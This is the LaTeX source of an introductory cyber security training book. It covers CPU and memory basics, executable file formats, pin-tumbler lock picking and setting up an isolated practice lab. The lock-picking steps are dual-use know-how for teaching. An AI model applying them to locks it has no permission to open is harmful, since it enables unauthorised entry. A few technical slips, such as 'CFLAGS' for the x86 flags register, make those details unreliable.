\documentclass[twoside,a4paper,11pt]{report}
\author{Jarrah Gosbell}
\title{CYSEC Training Program}
\usepackage{fancyhdr}
\pagestyle{fancy}
\renewcommand{\sectionmark}[1]{\markright{#1}}
\renewcommand{\chaptermark}[1]{%
	\markboth{\thechapter.\ #1}{}}
\makeatletter
\def\cleardoublepage{\clearpage\if@twoside \ifodd\c@page\else
%  \hbox{}
%  \vspace*{\fill}
%  \begin{center}
%    This page intentionally contains only this sentence.
%  \end{center}
%  \vspace{\fill}
  \thispagestyle{empty}
\newpage
  \if@twocolumn\hbox{}\newpage\fi\fi\fi}
\makeatother

\fancyfoot[C]{\thepage}
\usepackage{latexsym}
\usepackage{graphicx}
\usepackage{multirow}
\usepackage{longtable}
\usepackage{setspace}
\usepackage{multicol}
\usepackage{microtype}
\usepackage{menukeys}
\usepackage{attachfile}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{fancyvrb} %Allow bold in verbatim text.
\usepackage[section]{placeins} %Deal with floats being in the wrong place. 

\newcommand\frontmatter{%
    \cleardoublepage
  %\@mainmatterfalse
  \pagenumbering{roman}}

\newcommand\mainmatter{%
    \cleardoublepage
 % \@mainmattertrue
  \pagenumbering{arabic}}

\usepackage{color}
\definecolor{mygreen}{rgb}{0,0.6,0}
\definecolor{mygray}{rgb}{0.5,0.5,0.5}
\definecolor{mymauve}{rgb}{0.58,0,0.82}
\usepackage{xcolor}
\usepackage{listings}
\AtBeginDocument{\renewcommand{\thelstlisting}{\thesubsubsection.\arabic{lstlisting}}}
\def\l@lstlisting#1#2{\@dottedtocline{1}{3em}{3.5em}{#1}{#2}}
\lstset { 									%
%	language={[ANSI]C}, 					%
	otherkeywords={printf, strcpy, *, &, malloc},	%
	numbers=left, 							%
	numberfirstline=true,					%
	showspaces=false, 						%
	showtabs=false, 						%
	showstringspaces=false, 				%
	commentstyle=\color{mygreen}, 			%
	tabsize=4, 								%
	keywordstyle=\color{blue}, 				%
	xleftmargin=2em,						%
	extendedchars=true,     			    %
	basicstyle=\small\sffamily,				%
	columns=fullflexible,					%
	breaklines=true,		            	%
	literate={%								
    	*{0}{{{\color{brown}0}}}1					%
    	{1}{{{\color{brown}1}}}1					%
    	{2}{{{\color{brown}2}}}1					%
    	{3}{{{\color{brown}3}}}1					%
    	{4}{{{\color{brown}4}}}1					%
    	{5}{{{\color{brown}5}}}1					%
   		{6}{{{\color{brown}6}}}1					%
	    {7}{{{\color{brown}7}}}1					%
   		{8}{{{\color{brown}8}}}1					%	
	    {9}{{{\color{brown}9}}}1},				%
	stringstyle=\color{mymauve}}
\lstloadlanguages{C}
\lstloadlanguages{bash}
\lstloadlanguages{Python}
\definecolor{lightgray}{rgb}{.9,.9,.9}
\definecolor{darkgray}{rgb}{.4,.4,.4}
\definecolor{purple}{rgb}{0.65, 0.12, 0.82}

\lstdefinelanguage{JavaScript}{
  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{nmap}{
  keywords={ssh, domain, pop3, netbios, imap, samba, nfs, telnet, http, https, rpcbind, exec, login, shell, ingreslock, mysql, postgresql, vnc, X11, irc, microsoft, ftp}, 
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={tcp, udp, open, closed, VMware},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]",
  numbers=none
}
\lstdefinelanguage{bind}{
  keywords={options, directory, allow-transfer, allow-recursion, logging, channel, file, severity, print-severity, print-time, category, default, zone, type, allow-update, TTL, IN, SOA, A, NS, CNAME, MX, PTR}
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{;},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}
\lstdefinestyle{CLI} {%
	language=bash, 
	numbers=none,
	showspaces=false, 						%
	showtabs=false, 						%
	showstringspaces=false, 				%
	commentstyle=\color{black}, 			%
	tabsize=1, 								%
	keywordstyle=\color{blue}, 				%
	extendedchars=true,     			    %
	basicstyle=\small\sffamily,				%
	columns=fullflexible,					%
	breaklines=true,		            	%
	stringstyle=\color{mymauve}}
%Sorting code floats. 
\usepackage{float}
\floatstyle{ruled}
\newfloat{code}{htb}{loc}[chapter]
\floatname{code}{Code Example}
\renewcommand{\abstractname}{Introduction}
\interfootnotelinepenalty=10000
\setcounter{secnumdepth}{1}
\setcounter{tocdepth}{1}
\makeatletter
\usepackage{parskip}
\renewcommand*{\listof}[2]{%
	\@ifundefined{ext@#1}{\float@error{#1}}{%
		\expandafter\let\csname l@#1\endcsname \l@figure  % <- use layout of figure
		\@namedef{l@#1}{\@dottedtocline{1}{1.5em}{2.5em}}%
		\float@listhead{#2}%
		\begingroup
			\setlength\parskip{0pt plus 1pt}%               % <- or drop this line completely
			\@starttoc{\@nameuse{ext@#1}}%
		\endgroup}}
\makeatother
\usepackage{hyperref}
\begin{document}
\frontmatter
\maketitle
\tableofcontents
	\listoffigures
		\addcontentsline{toc}{chapter}{List of Figures}
	\listoftables
		\addcontentsline{toc}{chapter}{List of Tables}
	{\setstretch{2}
	 \renewcommand{\figurename}{Code Example}
	     \listof{code}{List of Code Examples}
	 }
		 \addcontentsline{toc}{chapter}{List of Code Examples}
\chapter{Introduction}
	This document was written as a one year introductory course to the field of Cyber Security. 
	Within it, is much of the Computer Science and technical information that one requires to start learning in the field. 
	However, this comes with a legal penalty. 
	Much of what you see in this book is illegal to conduct on systems which you do not own or have not received explicit permission to attack. 
	Thus, I request that you read through your local laws before attempting any of the exercises within the book. 
	Furthermore, I recommend setting up a virtual machine which can be used to run these exercises in a controlled environment without an Internet connection. 
	This simply reduces the risk of inputting the wrong command and accidentally attacking a target that you do not control. 

	This document will discuss both the utilization and creation of tools used to attack other systems. 
	As much as possible, it will attempt to develop an understanding of how these tools work and what they do. 
	However, it must be noted that this cannot be guaranteed. 
	Some of the tools which this document will discuss have been crafted into a single click hack, much like a gun. 
	One should remember that without understanding what these tools do, they are not in control. 
	In the same way as a gun in the hands of the untrained, these tools can be dangerous, and should be used with caution. 

	With this in mind, please continue through the pages of this book. 
	I hope you get as much from reading it as I did from writing it. 

	\section{Conventions}
		This book uses a number of conventions to convey it's content. 
		These allow for the code shown to be generic, or for commands to work on any computer available. 
		Table \ref{tab:BookConventions} explains the main conventions used herein. 
		\begin{table}[htb]
			\centering
			\begin{tabular}{|l|p{7cm}|}
				\hline
				\textbf{Convention} & \textbf{Meaning} \\ \hline
				<variable> & Replace with your version of variable. 
								Remove the <> from the code. \\ \hline
				\$ command & Command that can be run as a normal user. \\ \hline
				\# command & Command that must be run as Superuser. \\ \hline
			\end{tabular}
			\caption{List of Conventions Used Herein}
			\label{tab:BookConventions}
		\end{table}

\mainmatter
\chapter{Computer Operations}
	\label{ch:ComputerOperations}
	A computer can be thought of in terms of the systems which make it up, and the layers of those systems.
	At the base level, a computer is a structure of silicon, etched into the shape of a CPU die, then added into a bus with memory and IO.
	At the next level, the binary signals which are processed are taken into account, allowing the computer to act in a programmed way. 
	Finally, a computer is programmed in a language such as C or Python. This gives us the interfaces and systems which we interact with daily. 
	\section{Hardware}
		\subsection{CPU} 
			The CPU is the microprocessor which forms the heart of the modern computer. 
			While not the only microprocessor in a modern computer, they are the most major and the one which is commonly programmed for. 
			This lesson will discuss the current design and implementation of CPUs, and the impact of this on the way that a computer works. 
			This will be broken down into the fetch, decode, execute cycle, the physical units which make up the CPU and the connection which allows it to communicate with the rest of the computer. 
			\subsubsection{Fetch, Decode, Execute Cycle}
				The operation of a computer occurs through the repeated execution of a sequence of instructions.
				This cycle allows the computer to access the instructions stored in cache or RAM and determine how they should be enacted. This lesson will discuss the approach used on a classic RISC CPU similar to that of most modern phones. 
				Due to this, it will discount cache and threading. 
				\paragraph{Fetch}
					This step requires the CPU to request the next instruction from it's source. 
					This is possible as the CPU retains the address of the next instruction to complete in it's program counter. 
					After each fetch, the CPU will increment the address in its program counter. 
					However, this address may change due to the requirements of the instruction which was just fetched. 
					If the instruction has to be fetched from RAM rather than cache, the CPU may stall while waiting.
					This will freeze execution until the fetch cycle has been completed. 
				\paragraph{Decode}
					This step is performed on the Instruction Decoder, where the instruction which was fetched in the last step is converted into the signals which control other parts of the CPU to enact the instruction. 
					This decoding will occur based on the instruction set of the processor, which can be thought of as a look-up-table for valid instructions. 
					This will interpret the first chapter of the instruction, known as the opcode, and determine which signals must be sent to have the CPU execute the instruction. 
					The later fields are then sent as arguments to supplement the instruction. 
					This process may take place on a hardwired circuit, or through the use of a microprogram which, In either case the system output will be the same. 
					However, in the latter case, the microprogram will be re-writable, allowing for decoding to be altered after production. 
				\paragraph{Execute}
					This step causes the CPU to enact the requirements of the instruction, causing output to be written to a given register or memory location. 
					This may occur over multiple clock pulses, with each designating a new chapter of the instruction. 
					This can be seen through the action of the Arithmetic Logic Unit, which will perform its calculation to ensure that its output is stored in the register by the next clock pulse. 
			\subsubsection{CPU Structure}
				The CPU is made up of multiple parts which allow it to conduct its role within the computer. 
				Each of these parts perform only one task within the CPU, allowing others to process or store their output. 
				The most important of these components will be explained here. 
				\paragraph{The Control Unit}
					Contains the circuitry which interprets instructions and creates electrical signals which direct other parts of the CPU to carry out the instructions. 
					The control unit is also the communicator between the ALU and the Memory.
				\paragraph{The Arithmetic Logic Unit}
					(ALU) is the processor for both integer and bitwise logic. 
					The inputs for this circuit are the decoded signals from the Control Unit, as well as the Operands (arguments) which were passed with the instruction. 
					Once the calculation has taken place, the ALU will output to either the register or memory location designated by the instruction. 
				\paragraph{The Floating Point Unit}
					(FPU) is the logic circuit used to calculate floating point (real) numbers. 
					While these numbers can be computed using only the ALU, it is not optimized to calculate them.
					Thus to expedite the process an FPU was created. 
					These units will calculate mathematics on real numbers to a given precision (specified by the IEEE). % Reference this
					When a given precision is not supported, the ALU must run the calculation at a far slower pace. 
				\paragraph{Protected Mode} 
					Protected Mode is the mode of operation for the modern CPU. 
					This stemmed from security and multiprogramming issues found to occur in real mode. 
					In real mode, the current program can access all of the memory of the system, allowing it to overwrite that of other programs. 
					In protected mode, the segments used by each program are tracked by the processor to ensure that a program cannot write outside of it's own segment. 
					This is why we cannot run a buffer overflow into another program, the processor would pick it up and the program would segmentation fault. 
			\subsubsection{The Registers}
				The CPU also contains its own extremely fast memory, known as registers. 
				These blocks of memory are capable of being used as operands for instructions, and are commonly both the output and the input of a CPU instruction.\\ 
				There are specific uses for registers in the x86 CPU: \footnote{\url{http://www.eecg.toronto.edu/~amza/www.mindsec.com/files/x86regs.html}}
				\begin{itemize}
					\item General Registers: 
						\begin{itemize}
							\item RAX is the Accumulator register for IO, arithmetic, interrupt calls, etc. 
							\item RBX is the Base Register used as a base pointer for memory access. 
							\item RCX is the Counter register, used for loop counters. 
							\item RDX is the Data Register used for IO, arithmetic and interrupt calls. 
						\end{itemize}
					\item Segment Registers: 
						\begin{itemize}
							\item CS holds the current code segment. 
							\item DS holds the data segment of the current program. 
							\item ES, FS, GS are extra segment registers for far pointer addressing such as video memory. 
							\item SS Holds the Stack segment of the current program. 
						\end{itemize}
					\item Index and Pointer Registers: 
						\begin{itemize}
							\item RSI Source index register for string and memory array copying
							\item RDI Destination index register used for string and memory array copying
							\item RBP holds the stack base pointer. 
							\item RIP is the index pointer. Holds the offset of the next instruction. 
							\item RSP is the stack pointer. Holds the current head of the stack. 
						\end{itemize}
					\item CFLAGS holds the current state of the processor and the output or error of some instructions after execution. 
						These are usually used by other CPU instructions, rather than directly accessed.
						The use for each CFLAGS bit can be found in table \ref{tab:CFLAGSBits} 
						\begin{table}[htb]
							\centering
				\begin{adjustbox}{max width=1\textwidth}
							\begin{tabular}{| l | l | l |}
								\hline
								\textbf{Bit} &  \textbf{Label} &   \textbf{Description} \\\hline
								0   &   CF &     Carry flag \\ \hline
								2   &   PF   &   Parity flag \\ \hline
								4   &   AF   &   Auxiliary carry flag \\ \hline
								6   &   ZF   &   Zero flag \\ \hline
								7   &   SF   &   Sign flag \\ \hline
								8   &   TF   &   Trap flag \\ \hline
								9   &   IF   &   Interrupt enable flag \\ \hline
								10  &   DF   &   Direction flag \\ \hline
								11  &   OF   &   Overflow flag \\ \hline
								12-13 & IOPL &   I/O Privilage level \\ \hline
								14  &   NT   &   Nested task flag \\ \hline
								16  &   RF   &   Resume flag \\ \hline
								17  &   VM   &   Virtual 8086 mode flag \\ \hline
								18  &   AC   &   Alignment check flag (486+) \\ \hline
								19  &   VIF  &   Virtual interrupt flag \\ \hline
								20  &   VIP  &   Virtual interrupt pending flag \\ \hline
								21  &   ID   &   ID flag \\ \hline
						\end{tabular}
					\end{adjustbox}
						\caption{CFLAGS bit uses}
						\label{tab:CFLAGSBits}
					\end{table}
				\end{itemize}
				
				To see this in action, write a simple program to print ``Hello World'' ten times in C (an example of such a program can be found in the programming section), %TODO: reference this
				compile it with ``gcc -g <src>'' and run the following in GDB: (I also recommend the peda\footnote{\url{https://github.com/longld/peda}} extension to GDB for it's visualization functions)				
				%TODO: This still formats like shit. 
				\lstinputlisting[numbers=none]{./shellOut/GDBHelloWorld.out}
				In the above, we set a break point in main() (``break main'' or ``b main''), right before our code was executed. 
				This allows us to run the program, pausing it to view how the CPU is executing the code. 
				The command ``info registers'' or ``i r'' was then used to show what the registers of the CPU held at the time.
				This is how you will see registers in the future. 
				Understanding this view will make the future Programming and Reverse Engineering sections far easier. %TODO: Hyperlink this. 



				\subsection{RAM}
					%TODO: Add in chapter on segments of memory and protected mode. 
					The main memory of a computer, known as Random Access Memory (RAM) is the first storage device of the computer outside that of the processor. 
					RAM is used because it is fast, however, this comes at the loss of price and volatility. 
					When no electrical current is passing through RAM modules, the data held within will deteriorate. 
					The speed at which this occurs forms the basis for cold boot attacks. %TODO: Ref this to forensics. 
					For our purposes, memory should be thought of in terms of the segments and data structures which make it up. 
					\subsubsection{The .BSS Section}
						The BSS Section is the section of memory used for static and global variables. 
						Generally the variables outlined in this chapter are not initialized until the program is running. 
						A .BSS variable may be a memory location that you wish to store a string in later in the program. 
					\subsubsection{The .data Section}
						The data Section is the section for global variables which are to be initialised before the program starts. 
						This is where you would put the data which is to be accessed by the program, rather than through inputs or environmental variables. 
					\subsubsection{The .code Section}
						The code Section is the section which contains the code for the program. 
						It cannot create new variables, but it can access those created in the .BSS and .data chapters. 
						This chapter is usually broken through the use of labels and navigated by jump statements. 
						One should be careful to ensure that these statements do not become hard to follow. 
					\subsubsection{The Heap}
						The Heap is the data structure used to store larger memory items in a high level programming language. 
						In an object oriented language, items stored on the heap are usually created through the use of the ``new'' command. 
						In procedural languages, commands such as ``malloc'' are used to allocate memory to the heap. 
						In both of these instances, the command will allocate the necessary memory and return a pointer to that address. 
						Items stored on the heap start at lower memory locations and move to higher as more items are placed on the heap. 
						This will become important as we move to binary exploitation. 
					\subsubsection{The Stack}
						The Stack is the more widely used Data Structure. 
						Variables in any language as soon as they are named are stored on the stack frame of the current scope. 
						Even items stored on the heap have a pointer on the stack. 
						The program will create a new stack frame---a collection of instance variables---for each scope which it comes across. 
						This is best seen in functions, where the frame for main() will sit on the stack, followed by the frame of the first function called, followed by the next. 
						Each of these functions would have their own instance variables, all of which are stored within their frame. 
						When the function returns, its frame is popped from the stack and the stack pointer is raised to the last frame. 
						Unlike the heap, the stack starts at high memory locations and grows down towards the heap. 
						This can be used for overflows into heap variables. 
					\subsection{Program Memory}
						All of these components build together to form a programs memory. 
						This is the same, whether the program was written by hand in assembly or interpreted from python. 
						Figure \ref{fig:ProgramMemory} shows the layout and growth of memory\cite{shellcodersHandbook}. 
						\begin{figure}[htb]
							\centering
							\begin{tabular}{|c|}
								\hline
								 \textbf{Higher Addresses}\enspace\arrowkeyup \\ \hline
								 Argc \\ \hline
								 env pointer \\ \hline
								 Stack (Grows \arrowkeydown\,) \\ \hline
								 Unused Space (hopefully) \\ \hline
								 Heap (Grows \arrowkeyup\,) \\ \hline
								 .bss/.data \\ \hline
								 .code/.text \\ \hline
								 Shared Libraries \\ \hline
								 \textbf{Lower Addresses}\enspace\arrowkeydown \\ \hline
							 \end{tabular}
							 \caption{Memory Segmentation}
							 \label{fig:ProgramMemory}
						 \end{figure}


	\section{Assembly And Binary}
		While we may find it easier to interact with computers using high level programming languages or even pre-written programs and graphics, an understanding of how a computer works at the low level is required to properly exploit its process. 
		The first computer programs were written algorithmically, before being translated manually into binary or octal (base 8). 
		The program had to be inputted manually, one instruction at a time. 
		However, due to modern compilers, this has become unnecessary, since 1949 we have been able to automatically assemble programs into machine code. 
		This meant that assembly languages became the norm, allowing people to write programs at a far greater speed.
		These assembly programs, while directly mapped to the opcodes of binary computers were written in a form close to English and far more understandable than binary. 
		We have now left this time behind through the use of compiled languages. 
		However, an understanding of assembly is still necessary due to the difficulty of returning from binary to source code. 
		\subsubsection{Binary}
			On a computer, binary is everything.
			Every file, every program, every instruction is binary. 
			However, this is meaningless without some means of translating the numbers into their useful form. 
			This has led to instruction sets, file types, encodings and data types, each with their own means of translating the numbers found in binary into some meaningful representation. 
			For example, the source of this document is written in UTF-8, a superset of the ASCII format which translates binary numbers into characters. 
			Generally, this binary will be viewed either in the decoded form through a program such as a text editor (for UTF-8 or ASCII). 
			However, in cases where the format is not obvious, a hex editor would be employed. 
			These editors allow one to see the binary code in base 16 rather than base 2, reducing its length by a factor of 8. 
			Furthermore, these editors will display a ASCII representation of any text found, allowing one to read strings out of the file. 
			Another program, known as strings will automate the process of finding ASCII strings in binary. 
			Though it is exceptionally widespread, one need not understand binary in order to utilize these tools. 
		\subsubsection{Assembly}
			While everything may compile down to become binary, assembly is the code that will become binary to be executed on the computer. 
			This language is specific to the CPU that it is running on, meaning that there is no portability, but the scope for optimization is huge. 
			Assembly is mapped directly to the hardware layout of both the memory and the CPU, it interacts directly with the registers and creates the memory layout that was described above. 
			Thus, when you are writing assembly, you will have to take into account where the variables are stored and what actions are being conducted in that area. 
			Calling the kernel may just wipe out all of your registers, destroying the data that you just created. 

			This makes assembly exceptionally powerful, but also exceptionally error prone. 
			It is common for one who often writes in higher level languages to simply forget about a part of assembly that is handled by higher level languages. 
			Thus, when writing or altering assembly, one needs to have an understanding of the follow on effects of the actions. 

			The most major of these is that kernel calls or function calls will overwrite most registers. 
			This can be solved by using stack frames, pushing the registers to memory then making the call. 
			After the call you can retrieve all registers from memory, returning the CPU to it's prior state. 

			Another thing to take into account is that one instruction may alter the way that following instructions will run. 
			This is most evident in ``cmp'' and ``jmp'' group of instructions, which check the relevant CFLAGS bits to determine whether to follow the jump. 

			With this in mind, it becomes evident that writing assembly is not the most efficient way to write code. 
			Furthermore, when it is understood that even the best assembly programmers will not be able to optimize their code as well as a modern compiler will, it becomes evident that writing software in assembly is redundant. 
			Thus, in the modern day, assembly is used for three things:
			\begin{enumerate}
				\item Reverse Engineering.
				\item Specific embedded and driver applications.
				\item Learning low level Computer Science. 
			\end{enumerate}
			
			Due to this, this document will only discuss assembly for these reasons, such as in the \hyperref[ch:ReverseEngineering]{Reverse Engineering chapter} or the Shellcode section of Chapter \ref{ch:BinaryExploitation}.
			
	\section{Executable File Formats}
		There are specific details about the files that your computers runs that allow it to work in a certain way. 
		These formats are specific to the OS that is running on the computer, 
		and interact differently based on this. 
		This section will discuss these differences, as well as the way that different OS's link executable files together. 

		\subsection{Linux and ELFs}
			Linux uses the Executable and Linkable Format (ELF)\footnote{\href{http://linux.die.net/man/5/elf}{man 5 ELF}}. 
			This format is designed to standardise executables, object code, shared libraries and core dumps. 
			It was originally released with System V 4, quickly becoming the standard across UNIX and UNIX-like systems. 

			An ELF file, seen in figure \ref{fig:ELF}, has a number of structures which make allow it to link to various places on the system. 
			\begin{figure}
				\centering
				\includegraphics[scale=0.2]{./ELF.png}
				\label{fig:ELF}
				\caption{ELF Structures and Internal Linking}
			\end{figure}
			\begin{description}
				\item[Program Header Table:] This is a description and mapping of memory segments used in the program. 
					These could either be different modules of the program, or simply a divider for code and data. 
				\item[Section Header Table:] Describes the programs sections (such as .code or .data).
				\item[The Data Referred to by these Tables:] This is either the code or data itself which is described 
					and pointed to by thee above tables. 
			\end{description}

			These files are then linked to libraries, which are installed on the system to provide a given function to multiple programs\footnote{\url{http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html}}.
			These libraries mean that program ELF files can be small, as they do not have to contain the code required to conduct all tasks. 
			However, it also means that there is another attack point and a dependency on the system.

			Libraries are usually found in ``/usr/lib/'', and named libxxx.so. 
			These files contain the code for core functions which are often used by a number of programs. 
			When programming, once the expected header file has been included, using a library is as simple as calling a method as if you had written it in your code. 

			For these cases, when the program is compiled, a separate program known as a ``linker'' will create the required pointers within the ELF output, allowing the program to call libraries on any system it is placed on. 
			This system means that the header sections of ELF files often refer to files and functions which do not exist within the ELF itself\footnote{\url{http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html}}. 

			There are a number of tools which have been written to help working with ELF files:
			\begin{description}
				\item[readelf] Information gathering for ELF files. 
					Similar, but more detailed than objdump. 
				\item[objdump] Provides information and disassembly for object (and ELF) files. 
				\item[file] Attempt to determine type and information about a given file. 
					This will give some data on how the program was compiled. 
			\end{description}

		\subsection{Mach-O}
			Mach Object (or Mach-O) is the executable file format used on OS X, NeXTSTEP (which OS X was based on) and iOS. 
			As with ELF files, these are used for object code, shared libraries, linked code and core dumps\footnote{\url{https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/index.html}}.

			The file is made up of the header, followed by load commands which provide the system with the files and data that must be loaded for the system to be able to execute the code found within. 
			This is followed by a number of sections, similar to those of ELF files. 

			These files can also be formed into one binary that is able to be executed on multiple architectures. 
			This is useful on systems such as iOS, which must have 4 different versions of the ARM architecture to run on all devices. 

			As with ELF above, these files are dynamically linked, requiring the relevant ``.dylib'' files to exist on the system. 
			
			While the same tools as with Linux will work, otool specific to Mach-O files\footnote{\url{https://www.objc.io/issues/6-build-tools/mach-o-executables/}}.
			It is an object file displaying tool that works in a similar way to objdump, but can be told to just give header information. 

		\subsection{Windows Portable Executable}
			Portable Executable (PE) is the Windows executable format. 
			It is based on the older UNIX COFF format, which was eventually replaced with ELF. 
			These files are commonly found within ``.exe'' and ``.DLL'' files on windows, as these are the executable 
			package and dynamically linked libraries on this system. 
			\begin{figure}[t]
				\centering
				\includegraphics[scale=0.06]{./PE.png}
				\label{fig:PortableExecutable}
				\caption{Layout of Windows Portable Executable Files}
			\end{figure}

			This format retains some legacy DOS support in that a DOS header is placed at the top of the file. 
			This header can either contain a full DOS version of the program, or simply a stub informing the user that the program is not DOS compatible. 

			The format for these files can be seen in figure \ref{fig:PortableExecutable}. 
			The headers within this file describe to the linker how to map the file and it's required libraries into memory. 
			It also specifies execute and read permissions for that memory, for example, code is usually executable and read only, while data is usually non-executable but read/write. 
			
			A lookup table is also implemented in the import table. 
			This table allows the PE file to call on shared libraries found on the system. 
			It is also a good point of attack as we can change the files or locations pointed to by this table. 

			It is also worth noting that the PE format does not implement position independent code. 
			This means that addresses within the file must be recalculated each time the code is loaded,
			in contrast with ELF files, which usually implement fully position independent code. 
			
\chapter{Scoping and Mindset}
	\label{ch:ScopingMindset}
		No matter how good one gets at the technical aspects of hacking, they will never be good at it if they do not understand how to think about their target and attack. 
		One must understand the difference between attempting to beat down a stone wall with a battering ram and simply finding the key. 
		In a world where the tools to run an attack are easy and often have a GUI with a big red ``hack the target'' button, such as Armitage's ``hail Mary'' feature, 
		we often forget to work out what our client is. 
		This section will have you step back, away from the keyboard and look at what is happening. 
		We will start with lock picking, as it is \emph{the} past time of hackers. 
		Then, we will move to researching the system that you are targeting. 
		However, this latter section will also require you to understand the information gathering tools explained in chapter \ref{ch:NetworkPenetration}.
	\section{Lock Picking}
		Before starting this section, you will need to either purchase or borrow a pick set and a clear or open cut lock. 
		A simple hook pick and tension wrench will suffice and if you cannot find a clear lock, a cheap padlock will be easy enough to practice on. 
		In this section, we will focus on the pin tumbler lock, which is the most common lock type used in cheap locking mechanisms, and the easiest to learn to pick. 
		An example of this type of lock can be seen in figure \ref{fig:PinTumblerLock}.\footnote{\url{https://commons.wikimedia.org/wiki/File:Pin\_and\_tumbler\_lock\_picking.PNG}}
		Furthermore, the ideas used in this section will be added to in later chapters, notably in chapter \ref{ch:WirelessAttacks} where we will clone NFC access cards. 
		\begin{figure}[htb]
			\centering
			\includegraphics[scale=0.6]{./PinTumblerLock.png}
			\caption{Example of Picking a Pin and Tumbler Lock}
			\label{fig:PinTumblerLock}
		\end{figure}
		\subsection{How the Pin and Tumbler Lock Works}
			As can be seen in figure \ref{fig:PinTumblerLock}, this type of lock uses a number of sprint loaded pins which stop the plug of the lock moving within the housing. 
			Within this plug is a long, thin slot for the key (or our picks) with small ledges in the sides to both stop pins from falling and hinder those attempting to pick the lock. 
			A series of holes are drilled through the top of the housing and into the plug. 
			These holes are where the spring loaded pins enter, with the lower pin fully entering the plug and the upper pin being split across the sheer point. 
			It is this action which both allows the lock to remain closed when the key is not inserted and allows us to pick the lock. 
			When a torque is placed on the plug, some of these pins will begin to bind with the sheer point. 
			Using this, we can begin to pick the lock. 

		\subsection{Pin by Pin Picking}
			The first step when attempting to pick a lock is to place the tension wrench into the bottom of the lock and apply a slight pressure. 
			This pressure is designed to cause the top pins to catch on the sheer point of the plug, allowing some of the pins to bind. 
			Once this has occurred, a pick should be used to test each of the pins, determining how many there are and which ones have become bound to the sheer point. 

			The idea here is to place a small amount of pressure on the pins which bind to the sheer point in order of their binding. 
			This should leave the upper pin lodged above the plug, with the lower pin dropped into the key way. 
			Continue with this until either you have bound all pins and the lock is open, or you cannot determine whether pins have set or not. 
			If the latter, reset the pins by releasing pressure on the tension wrench. 
		\subsection{Raking}
			If on the other hand, you are the kind of person with little patience and a strong desire to get in, you can attempt raking. 
			In this process, you set the lock up in the same manner, but rather than attempting to find and set binding pins, you simply saw along the line. 
			When attempting this, no more than two pins are likely to set on each pass, with passes that set no pins being common. 
			Thus, you should repeatedly attempt rake until either the lock opens or you feel that you are getting no where. 
			During this process, you may also want to slightly adjust the amount of torque placed on the plug, however, be wary not to place too much torque on it. 

	\section{Research}
	\section{Problem Solving}
\chapter{The Cyber Range}
	Before starting to apply the skills given in the following chapters, it would be best to set up an area where you can practice without fear of accidental misfortune\cite{pentestingLabs}
	A ``Cyber Range'' is an area---completely disconnected from all target networks---in which you can work on your skills safely.  
	It allows you to try attacks that you would not otherwise be able to do and create scenarios that could not be done on a single computer. 
	
	These ranges can become a full time occupation in themselves, servicing a whole university. 
	However, the range outlined in this chapter will be confined to one or two computers, avoiding most of the complexity of these larger ranges, 
	while still giving you the benefits of multiple machines. 
	\section{Your Workstation}
		The setup for your computer in itself can be anything that you can run. 
		For example, my two main systems are an OS X laptop and an Arch Linux desktop. 
		These systems, while both UNIX in nature, are significantly different in their running. 
		However, they both have the basic requirements for creating a Cyber Range workstation: virtualization and high end hardware. 

		\subsection{Hardware}
			You will need to build a system that can run multiple operating systems at the same time. 
			This is because many of the attacks outlined in this book cannot be done against one's own computer, 
			but for security should not be done against another machine. 

			Generally, the basic hardware requirements are as follows:
			\begin{description}
				\item[Quad Core CPU] Having a Quad Core CPU or better allows the system to run multiple processes at the same time. 
					This means that we can use virtualization to run a number of different systems simultaneously. 
					More here will be better. However, a Quad core CPU with Hyperthreading can easily run 3-4 Virtual Machines at any one time. 
				\item[8GB Memory] Having at least 8GB of memory available will mean that more than just the main OS will be able to loaded into memory at one time. 
					However, This is an absolute minimum requirement. 
					Having at least 16GB will make the system far more usable. 
				\item[Large Fast Storage] Running VMs is a task that needs both large amounts of storage and quick access to it. 
					Due to this, it is recommended that you install an SSD which can store the main OS and main VMs. 
					However, if you are dealing with a large set of target VMs, it would also be worthwhile adding a large rotational storage device for their storage. 
			\end{description}

			This level of hardware is easily available on both modern laptops and desktops. 
			Thus, you should be able to create a physical workstation that is more than capable of keeping up with your work. 
			
		\subsection{Virtualization}
			To enable you to run multiple operating systems and networks on one computer, you will need a well setup virtualization environment. 
			There are two competing products in this field, VMware's Workstation (or Fusion on OS X) and Oracle's VirtualBox. 
			While generally, these products will both do the same thing, there are some differences that make VMware's solution better. 
			Specifically, it's environment and integration with vSphere, VMware's hypervisor allows one to create far more powerful networks and systems. 
			
			However, if your goal is to set up a range on a budget, using VirtualBox will serve you best. 
			It has an open source version, which can be accessed for free, but has limitations on USB pass-through and other features. 
			Furthermore, the closed source version is also available free for non-commercial use. 

			The VMware alternative to this is VMware player. 
			However, you are far better off using either VirtualBox or VMware Workstation, rather than taking the middle ground and using player. 
			It is missing a significant number of features, making it a poor choice for creating a Cyber Range. 

			This document will use VMware Workstation/Fusion and VMware ESXi as the virtualization environment. 
			This is to standardize with the environment it was written in more than any other reason. 
			If the above leads to you choosing VirtualBox, most of the content discussed in this chapter will still work. 
		
		\subsection{Recommended VMs}
			This section will discuss the VMs that are commonly used for the creation of a virtual network for practising these skills. 
			\begin{description}
				\item[Kali Linux] Kali\footnote{\url{http://www.kali.org/}} is the main OS for Penetration testing. 
